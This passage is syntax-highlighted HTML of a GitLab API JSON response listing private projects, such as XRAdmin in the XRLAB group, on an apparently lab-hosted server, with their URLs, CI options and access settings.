class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/issues&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;merge_requests&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/merge_requests&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;repo_branches&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/repository/branches&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;labels&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/labels&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;events&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/events&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;members&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/members&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;cluster_agents&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/cluster_agents&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;packages_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;empty_repo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;archived&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;visibility&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;resolve_outdated_diff_discussions&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_expiration_policy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;cadence&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;keep_n&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;older_than&quot;</span><span class="punctuation">:</span> <span class="string">&quot;90d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.*&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex_keep&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;next_run_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-26T08:30:12.373Z&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;jobs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;service_desk_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;service_desk_address&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;can_create_merge_request_in&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;repository_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forking_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;builds_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;pages_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;operations_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;analytics_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;security_and_compliance_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;releases_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;environments_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;feature_flags_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;infrastructure_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;monitor_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;emails_disabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_runners_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;lfs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;creator_id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_type&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;none&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;open_issues_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_default_git_depth&quot;</span><span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_forward_deployment_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_job_token_scope_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_separated_caches&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_opt_in_jwt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;public_jobs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;build_timeout&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_cancel_pending_pipelines&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_config_path&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_with_groups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_pipeline_succeeds&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;allow_merge_on_skipped_pipeline&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;restrict_user_defined_variables&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;request_access_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_all_discussions_are_resolved&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;remove_source_branch_after_merge&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;printing_merge_request_link_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;merge&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_option&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default_off&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;enforce_auth_checks_on_uploads&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;suggestion_commit_message&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issue_branch_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_deploy_strategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;continuous&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;autoclose_referenced_issues&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;keep_latest_artifact&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;runner_token_expiration_interval&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;project_access&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;group_access&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">                <span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span> </span><br><span class="line">                <span class="attr">&quot;notification_level&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRAdmin&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRLAB / XRAdmin&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xradmin&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab/xradmin&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-25T07:48:16.751Z&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;default_branch&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;tag_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;topics&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ssh_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@gitlab.xiaorang.lab:xrlab/xradmin.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;http_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/xradmin.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/xradmin&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;readme_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/xradmin/-/blob/main/README.md&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forks_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;star_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;last_activity_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-05-30T10:27:31.762Z&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRLAB&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;group&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;full_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;parent_id&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/groups/xrlab&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;_links&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;self&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/4&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;issues&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/issues&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;merge_requests&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/merge_requests&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;repo_branches&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/repository/branches&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;labels&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/labels&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;events&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/events&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;members&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/members&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;cluster_agents&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/cluster_agents&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;packages_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;empty_repo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;archived&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;visibility&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;resolve_outdated_diff_discussions&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_expiration_policy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;cadence&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;keep_n&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;older_than&quot;</span><span class="punctuation">:</span> <span class="string">&quot;90d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.*&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex_keep&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;next_run_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-26T07:48:16.788Z&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;jobs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;service_desk_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;service_desk_address&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;can_create_merge_request_in&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;repository_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forking_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;builds_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;pages_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;operations_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;analytics_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;security_and_compliance_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;releases_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;environments_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;feature_flags_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;infrastructure_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;monitor_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;emails_disabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_runners_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;lfs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;creator_id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_type&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;none&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;open_issues_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_default_git_depth&quot;</span><span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_forward_deployment_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_job_token_scope_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span 